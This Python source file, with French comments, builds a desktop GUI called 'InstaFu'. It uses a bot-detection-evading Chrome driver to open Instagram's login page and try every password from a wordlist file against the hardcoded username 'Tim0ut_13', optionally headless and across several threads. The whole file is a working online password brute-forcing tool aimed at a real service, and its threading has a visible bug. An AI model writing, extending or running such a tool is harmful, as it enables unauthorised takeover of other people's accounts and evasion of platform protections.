import threading
import undetected_chromedriver as uc

import sys
from PyQt5.QtWidgets import QApplication
from PyQt5.QtCore import Qt, QDateTime
from PyQt5.QtWidgets import QWidget, QLabel, QPushButton, QCheckBox, QSlider, QTextEdit

from Resources.pass_to_temp import password_list
from pages.login_page import LoginPage

# Déclaration des variables global
headless = False
core = 1
processes = []
# Config var
url = 'https://www.instagram.com/accounts/login/'
input_file = "../test.txt"
num_temp = 1
# groups = split_words(password_list(input_file), num_temp)
username = 'Tim0ut_13'


class Fenetre(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("InstaFu")
        self.setGeometry(100, 100, 800, 600)
        self.setFixedSize(800, 600)


        # Création du layer
        self.layer = QWidget(self)
        self.layer.setGeometry(0, 0, 800, 50)
        self.layer.setStyleSheet("background-color: rgb(51, 51, 51);")

        # Création du bouton Run
        self.boutonRun = QPushButton("Run", self.layer)
        self.boutonRun.setGeometry(730, 10, 50, 25)
        # Centrer le bouton horizontalement
        # self.boutonRun.move((self.layer.width() - self.boutonRun.width()) // 2, self.boutonRun.y())
        self.boutonRun.setStyleSheet(
            "QPushButton {color: #ccc;}"
        )

        # Création de la checkbox Headless
        self.checkboxHeadless = QCheckBox("Headless", self.layer)
        self.checkboxHeadless.setGeometry(25, 0, 200, 50)
        self.checkboxHeadless.setChecked(False)
        self.checkboxHeadless.setStyleSheet(
            "QCheckBox::indicator {background-color: #ccc;}"
            "QCheckBox::indicator:checked {background-color: #00CC66;}"
            "QCheckBox::indicator:unchecked {background-color: #ff0000;}"
            "QCheckBox {color: #e6e6e6;}"
        )

        # Création d'un label pour le slider CPU
        self.labelCPU = QLabel("CPU:", self.layer)
        self.labelCPU.setGeometry(150, 0, 200, 50)
        self.labelCPU.setStyleSheet(
            "QLabel {color: #ccc;}"
        )

        # Création du slider CPU
        self.sliderCPU = QSlider(Qt.Horizontal, self)
        self.sliderCPU.setGeometry(200, 2, 100, 50)
        self.sliderCPU.setMinimum(1)
        self.sliderCPU.setMaximum(10)
        self.sliderCPU.setValue(1)

        # Création du label pour l'affichage du nombre sélectionné
        self.nbrCPU = QLabel(self)
        self.nbrCPU.setGeometry(180, 0, 20, 50)
        self.nbrCPU.setAlignment(Qt.AlignCenter)
        self.nbrCPU.setText(str(self.sliderCPU.value()))
        self.nbrCPU.setStyleSheet(
            "QLabel {color: #ccc;}"
        )

        # Création du retour pour les print
        self.console = QTextEdit(self)
        self.console.setGeometry(0, 50, 800, 550)
        self.console.setStyleSheet("""
        QTextEdit {
            background-color: black;
            color: white;
            font-family: monospace;
            font-size: 12px;
        }
        """)

        # Connexion de la fonction à l'événement de changement de valeur du slider
        self.sliderCPU.valueChanged.connect(self.updateLabelCPU)

        # Connexion de la fonction run au boutonRun
        self.boutonRun.clicked.connect(self.run)

        # Affichage de la fenêtre
        self.show()

    def updateLabelCPU(self):
        global core
        self.nbrCPU.setText(str(self.sliderCPU.value()))
        core = self.sliderCPU.value()

    def print_message(self, message):
        now = QDateTime.currentDateTime()
        self.console.append(f"{now.toString('hh:mm:ss')} $ {message}")

    def run(self):
        global core
        self.print_message(core)
        # Create Thread for each core
        threads = []
        for i in range(core):
            thread = threading.Thread(target=self.login(i))
            thread.start()
            threads.append(thread)
        # Wait for all the threads to finish
        for thread in threads:
            thread.join()
        # Show results
        for thread in threads:
            self.print_message(thread.result)

    def login(self, i):

        # Configuration of chrome driver options
        self.print_message(f'Core n°{i} - Starting........')
        self.print_message(f'Core n°{i} - Driver configuration')
        options = uc.ChromeOptions()
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--no-sandbox")
        options.add_argument("--blink-settings=imagesEnabled=false")
        prefs = {}
        prefs["profile.managed_default_content_settings.images"] = 2
        options.add_experimental_option("prefs", prefs)
        options.add_argument("--disable-gpu")

        # Configuration of headless mode
        if headless:
            self.print_message(f'Core n°{i} - Headless mode activated')
            options.add_argument("--headless")
        else:
            self.print_message(f'Core n°{i} - Headless mode deactivated')

        # Creating instance of Chrome driver
        self.print_message(f'Core n°{i} - Driver creation')
        driver = uc.Chrome(version_main=116, options=options)
        self.print_message(f'Core n°{i} - Driver created')
        self.print_message(f'Core n°{i} - Starting page')
        login_page = LoginPage(driver, i)
        driver.implicitly_wait(3)

        ct = 0

        # Todo:
        #   1. password_list() method who return a list of strings
        #   form a temp file. Charge the list from file HERE
        self.print_message(f'Core n°{i} - Connecting to {url}')
        login_page.open_page(url)
        self.print_message(f'Core n°{i} - handling cookies')
        login_page.is_cookies_here()

        # temp = password_list(f'temp{proc}.txt')
        temp = password_list(input_file)

        # t = (datetime.now() - t1).seconds
        # print(f'Config Exec Time : {t}')

        for password in temp:
            # t1 = datetime.now()
            ct += 1
            self.print_message(f'Core n°{i} - ({ct}) trying password [{password}]')
            login_page.login_action(username, password)
            login_page.is_password_works(password, ct)
            if login_page.test == 'wrong':
                self.print_message(f'Core n°{i} - ({ct}) wrong password [{password}]')
            # t = (datetime.now() - t1).seconds
            # print(f'Trying Password Exec Time : {t}')


if __name__ == "__main__":
    app = QApplication(sys.argv)
    fenetre = Fenetre()
    fenetre.show()

    # Execut QT application
    app.exec_()
